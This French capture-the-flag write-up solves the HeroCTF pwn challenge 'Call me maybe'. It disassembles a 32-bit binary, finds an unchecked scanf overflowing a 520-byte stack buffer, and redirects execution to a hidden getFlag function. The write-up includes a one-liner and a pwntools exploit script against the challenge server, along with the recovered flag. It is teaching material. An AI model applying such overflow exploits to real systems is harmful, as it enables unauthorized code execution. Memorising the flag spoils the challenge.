# Call me maybe

### Catégorie
Pwn

### Description
Cette fois l'organisateur se permet de juger vos goûts en termes de couleurs ?!

Prenez-le à son propre jeu et récupérez le flag.

nc challs.heroctf.fr 7001
Format : Hero{flag}

### Auteur
SoEasY

### Fichiers
Le binaire executé par le service : BOO_2

### Solution
Deuxième challenge dans la série des buffer overflow, on se retrouve avec le binaire "BOO_2".
Même sentence que pour le premier, on commence par faire un file sur l'exécutable pour voir à quoi on a affaire.
```bash
$ file BOO_2 
BOO_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, BuildID[sha1]=252fb7f9439139a76e929befad4355f78b5794a8, for GNU/Linux 3.2.0, not stripped
```
On a donc cette fois un exécutable x86 (32 bits), non strippé parce qu'on est sympas :D
On se balade un peu dans le binaire et on trouve une fonction `getFlag` en `0x080491c2` que l'on désassemble avec Cutter.

```nasm
54: sym.getFlag ();
; var int32_t var_4h @ ebp-0x4
0x080491c2      push ebp
0x080491c3      mov ebp, esp
0x080491c5      push ebx
0x080491c6      sub esp, 4
0x080491c9      call geteuid       ; sym.imp.geteuid ; uid_t geteuid(void)
0x080491ce      mov ebx, eax
0x080491d0      call geteuid       ; sym.imp.geteuid ; uid_t geteuid(void)
0x080491d5      sub esp, 8
0x080491d8      push ebx
0x080491d9      push eax
0x080491da      call setreuid      ; sym.imp.setreuid
0x080491df      add esp, 0x10
0x080491e2      sub esp, 0xc
0x080491e5      push str.cat_flag.txt ; 0x804a008 ; const char *string
0x080491ea      call system        ; sym.imp.system ; int system(const char *string)
0x080491ef      add esp, 0x10
0x080491f2      nop
0x080491f3      mov ebx, dword [var_4h]
0x080491f6      leave
0x080491f7      ret
```

Ok ! on voit que cette fonction va en effet récupérer le flag en faisant un `cat` sur le fichier `flag.txt`.
Cependant, si on affiche les adresses qui référencent cette fonction (appui de la touch "x" sur le nom de la fonction), on remarque que cette jolie fonction n'est jamais appelée...

![screenshot](https://raw.githubusercontent.com/HeroCTF/HeroCTF_v2/master/Pwn/Call%20me%20maybe/xrefs.png)

On désassemble ensuite la fonction `main`.
```nasm
55: int main (int32_t arg_4h);
; var int32_t var_4h @ ebp-0x4
; arg int32_t arg_4h @ esp+0x24
0x08049242      lea ecx, [arg_4h]
0x08049246      and esp, 0xfffffff0
0x08049249      push dword [ecx - 4]
0x0804924c      push ebp
0x0804924d      mov ebp, esp
0x0804924f      push ecx
0x08049250      sub esp, 4
0x08049253      mov eax, dword [stdout] ; obj.__TMC_END
                                   ; 0x804c034
0x08049258      push 0             ; size_t size
0x0804925a      push 2             ; 2 ; int mode
0x0804925c      push 0             ; char *buf
0x0804925e      push eax           ; FILE*stream
0x0804925f      call setvbuf       ; sym.imp.setvbuf ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
0x08049264      add esp, 0x10
0x08049267      call vuln          ; sym.vuln
0x0804926c      mov eax, 0
0x08049271      mov ecx, dword [var_4h]
0x08049274      leave
0x08049275      lea esp, [ecx - 4]
0x08049278      ret
```

Ici rien d'extrêmement intéressant, à part le call de la fonction vuln, visiblement sans argument.
On désassemble alors cette fonction.
```nasm
74: sym.vuln ();
; var char *var_208h @ ebp-0x208
0x080491f8      push ebp
0x080491f9      mov ebp, esp
0x080491fb      sub esp, 0x208
0x08049201      sub esp, 0xc
0x08049204      push str.C_est_quoi_ta_couleur_pr__f__r__e ; 0x804a018 ; const char *s
0x08049209      call puts          ; sym.imp.puts ; int puts(const char *s)
0x0804920e      add esp, 0x10
0x08049211      sub esp, 8
0x08049214      lea eax, [var_208h]
0x0804921a      push eax
0x0804921b      push 0x804a03c     ; const char *format
0x08049220      call __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x08049225      add esp, 0x10
0x08049228      sub esp, 8
0x0804922b      lea eax, [var_208h]
0x08049231      push eax
0x08049232      push str.Argh_moi_jsuis_pas_fan_du__s... ; 0x804a040 ; const char *format
0x08049237      call printf        ; sym.imp.printf ; int printf(const char *format)
0x0804923c      add esp, 0x10
0x0804923f      nop
0x08049240      leave
0x08049241      ret
```
On remarque alors l'initialisation d'un buffer de caractères appelé `var_208h` (`var char *var_208h @ ebp-0x208`) de taille 0x208 = 520 octets.
En continuant d'explorer on se rend compte que l'input utilisateur sera stocké dans le buffer, avec un format qui est surement `%s` pour une chaine de caractères.
```nasm
0x08049214      lea eax, [var_208h]
0x0804921a      push eax
0x0804921b      push 0x804a03c     ; const char *format
0x08049220      call __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
```
Aucun control n'est fait sur le nombre de caractères maximum entrés en input, on va alors pouvoir overflow le buffer et call notre fonction `getFlag` !

Nous allons donc devoir overflow un buffer de 520 octets + 4 octets pour ebp (on est en x86) soit 524 octets avant de pouvoir réécrire eip (instruction pointer) et jump sur la fontion `getFlag` (toujours en `0x080491c2`).

Pour cela il y a encore deux écoles : 
- La team "one liner"
```bash
python2.7 -c "print('A'*524 + '\xc2\x91\x04\x08')" | nc challs.heroctf.fr 7001
C'est quoi ta couleur préférée ?

Argh moi jsuis pas fan du AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
```
- La team "pwntools"
```python
#!/usr/bin/python
from pwn import *

r = remote('challs.heroctf.fr', 7001)

buff = "A"*524
buff += p32(0x080491c2)

r.sendline(buff)
r.interactive()
```
Exécution :
```bash
python 2.py 
[+] Opening connection to challs.heroctf.fr on port 7001: Done
[*] Switching to interactive mode
C'est quoi ta couleur préférée ?

Argh moi jsuis pas fan du AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04...
Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to challs.heroctf.fr port 7001
```

### Flag
Hero{Jump1ng_L1k3_Kr1ss_Kr0ss}
